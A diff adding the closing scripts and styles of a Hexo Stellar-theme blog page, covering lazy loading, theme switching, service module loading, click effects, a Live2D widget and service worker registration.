+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const l_body = document.querySelector('.l_body');
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=mp2fxa0i" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/scrollreveal@4.0/dist/scrollreveal.min.js"></script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const slideUp = {
+      distance: `12px`,
+      duration: `400`,
+      interval: `80`,
+      scale: `0.98`,
+      opacity: 0,
+      easing: "ease-out",
+      reset: false,
+      mobile: false,
+      useDelay: 'once'
+    };
+    ScrollReveal({ container: '.widgets' }).reveal('.slide-up', { ...slideUp });
+    ScrollReveal({ container: '.l_main' }).reveal('.slide-up', { ...slideUp });
+    ScrollReveal({ container: '.l_right' }).reveal('.slide-up', { ...slideUp });
+  });
+</script>
+<script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    mermaid.initialize({
+      theme: "default",
+      logLevel: 3
+    });
+    mermaid.run({ querySelector: '.mermaid' });
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Custom Image Viewer -->
+<script src="/js/plugins/image-viewer.js"></script>
+
+<!-- Custom Context Menu -->
+<script src="/js/plugins/custom-context-menu.js"></script>
+
+<!-- Glitch Effect -->
+<script src="/js/plugins/glitch-effect.js"></script>
+
+<!-- Terminal Copy -->
+<script src="/js/plugins/terminal-copy.js"></script>
+
+<!-- Hotkeys -->
+<script src="/js/plugins/hotkeys.js"></script>
+
+<!-- Achievements / Card System -->
+<script src="/js/plugins/achievements.js?v=mp2fxa0i"></script>
+
+<!-- Special Days - 节日彩蛋系统 -->
+<script src="/js/plugins/special-days.js"></script>
+
+<!-- Music Player -->
+<script src="/js/plugins/music-player.js"></script>
+
+<!-- Offline Vault - 断网保护机制 -->
+<script src="/js/plugins/offline-vault.js"></script>
+
+<!-- 默认设置配置文件 -->
+<script src="/settings/defaults.js"></script>
+<script>
+// 将 defaults.js 的默认值应用到 localStorage 空缺项
+(function() {
+  if (!window._siteDefaults) return;
+  for (var k in window._siteDefaults) {
+    if (localStorage.getItem(k) === null) {
+      localStorage.setItem(k, window._siteDefaults[k]);
+    }
+  }
+})();
+</script>
+
+<!-- Live2D Widget - Local Version -->
+<script src="/live2d-widget/dist/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 0 !important;
+    right: 10px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: scale(var(--waifu-scale, 1)) !important;
+    transform-origin: bottom right !important;
+    /* 不覆盖 display，由 autoload.js 和 waifu.css 控制显隐 */
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 -->
+<script>
+(function() {
+  var clickEffects = {
+    current: null,
+    
+    init: function() {
+      this.current = localStorage.getItem('clickEffect') || 'none';
+      this.bindEvents();
+    },
+    
+    bindEvents: function() {
+      var self = this;
+      document.addEventListener('click', function(e) {
+        if (self.current === 'none') return;
+        if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) return;
+        self.createEffect(e.clientX, e.clientY);
+      });
+      
+      window.addEventListener('storage', function(e) {
+        if (e.key === 'clickEffect') {
+          self.current = e.newValue || 'none';
+        }
+      });
+    },
+    
+    createEffect: function(x, y) {
+      switch(this.current) {
+        case 'ripple': this.createRipple(x, y); break;
+        case 'firework': this.createFirework(x, y); break;
+        case 'particles': this.createParticles(x, y); break;
+        case 'text': this.createText(x, y); break;
+        default: break;
+      }
+    },
+    
+    createRipple: function(x, y) {
+      var ripple = document.createElement('div');
+      ripple.className = 'click-ripple';
+      ripple.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:0;height:0;border-radius:50%;background:rgba(52,152,219,0.4);transform:translate(-50%,-50%);pointer-events:none;z-index:9999;animation:rippleExpand 0.6s ease-out forwards;';
+      document.body.appendChild(ripple);
+      setTimeout(function() { ripple.remove(); }, 600);
+    },
+    
+    createFirework: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff'];
+      for (var i = 0; i < 12; i++) {
+        var particle = document.createElement('div');
+        var angle = (Math.PI * 2 / 12) * i;
+        var velocity = 50 + Math.random() * 30;
+        particle.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:6px;height:6px;border-radius:50%;background:' + colors[i % 5] + ';pointer-events:none;z-index:9999;transform:translate(-50%,-50%);';
+        document.body.appendChild(particle);
+        this.animateParticle(particle, x, y, x + Math.cos(angle) * velocity, y + Math.sin(angle) * velocity, 500);
+      }
+    },
+    
+    createParticles: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd'];
+      for (var i = 0; i < 8; i++) {
+        var particle = document.createElement('div');
+        particle.innerHTML = '✨';
+        particle.style.cssText = 'position:fixed;left:' + (x + (Math.random()-0.5)*30) + 'px;top:' + (y + (Math.random()-0.5)*30) + 'px;font-size:16px;pointer-events:none;z-index:9999;animation:particleFloat 0.8s ease-out forwards;';
+        document.body.appendChild(particle);
+        setTimeout(function(p) { return function() { p.remove(); }; }(particle), 800);
+      }
+    },
+    
+    createText: function(x, y) {
+      var texts = ['666', '厉害', 'nice', '棒', '赞', '给力'];
+      var text = document.createElement('div');
+      text.innerHTML = texts[Math.floor(Math.random() * texts.length)];
+      text.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;font-size:18px;font-weight:bold;color:#3498db;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);animation:textFloat 0.8s ease-out forwards;';
+      document.body.appendChild(text);
+      setTimeout(function() { text.remove(); }, 800);
+    },
+    
+    animateParticle: function(el, startX, startY, endX, endY, duration) {
+      var startTime = performance.now();
+      function animate(currentTime) {
+        var progress = Math.min((currentTime - startTime) / duration, 1);
+        var easeOut = 1 - Math.pow(1 - progress, 3);
+        el.style.left = (startX + (endX - startX) * easeOut) + 'px';
+        el.style.top = (startY + (endY - startY) * easeOut) + 'px';
+        el.style.opacity = 1 - progress;
+        if (progress < 1) requestAnimationFrame(animate);
+        else el.remove();
+      }
+      requestAnimationFrame(animate);
+    }
+  };
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() { clickEffects.init(); });
+  } else {
+    clickEffects.init();
+  }
+  
+  window.ClickEffects = clickEffects;
+})();
+</script>
+
+<style>
+@keyframes rippleExpand {
+  0% { width: 0; height: 0; opacity: 1; }
+  100% { width: 100px; height: 100px; opacity: 0; }
+}
+@keyframes particleFloat {
+  0% { opacity: 1; transform: translateY(0) scale(1); }
+  100% { opacity: 0; transform: translateY(-40px) scale(0.5); }
+}
+@keyframes textFloat {
+  0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -80px) scale(1.2); }
+}
+</style>
+
+<!-- PWA Service Worker -->
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').then(function(reg) {
+    console.log('Service Worker 已注册，支持离线访问');
+  }).catch(function(err) {
+    console.log('Service Worker 注册失败:', err);
+  });
+}
+</script>
+
+<!-- Random Cover Image -->
+<script>
+(function() {
+  function refreshRandomCovers() {
+    var images = document.querySelectorAll('img[src*="loliapi.com"]');
+    images.forEach(function(img) {
+      var src = img.src;
+      var baseSrc = src.split('?')[0];
+      img.src = baseSrc + '?t=' + Date.now() + '&r=' + Math.random().toString(36).substr(2, 9);
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', refreshRandomCovers);
+  } else {
+    refreshRandomCovers();
+  }
+})();
+</script>
+
+</div></body></html>
